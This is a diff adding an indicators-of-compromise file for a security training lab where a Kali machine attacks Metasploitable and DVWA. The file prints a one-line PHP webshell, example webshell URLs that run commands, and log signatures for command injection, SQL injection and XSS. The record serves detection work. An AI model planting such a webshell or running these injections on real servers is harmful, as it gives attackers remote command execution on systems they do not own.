@@ -1,0 +1,21 @@
+# Indicators of Compromise (IoCs) - M1BLUR Lab
+
+## Network IoCs
+- Attacker IP: 172.22.0.1 (Kali)
+- Target IPs: 172.22.0.20 (Metasploitable), 172.22.0.30 (DVWA)
+- Suspicious URLs:
+  - http://172.22.0.30/hackable/uploads/shell.php?cmd=whoami
+  - http://172.22.0.30/hackable/uploads/shell.php?cmd=ls%20-la
+  - /vulnerabilities/exec/ (POST requests with command injection)
+  - /vulnerabilities/sqli/?id= (SQL injection attempts)
+
+## File IoCs
+- Webshell: /var/www/html/hackable/uploads/shell.php
+- Content: <?php system($_GET["cmd"]); ?>
+- MD5: (to be calculated)
+
+## Log Signatures
+- Access logs: GET /hackable/uploads/shell.php?cmd=
+- Access logs: POST /vulnerabilities/exec/ with parameters
+- Access logs: GET /vulnerabilities/sqli/?id= with UNION, SELECT, etc.
+- Access logs: XSS patterns: <script>, alert(), document.location
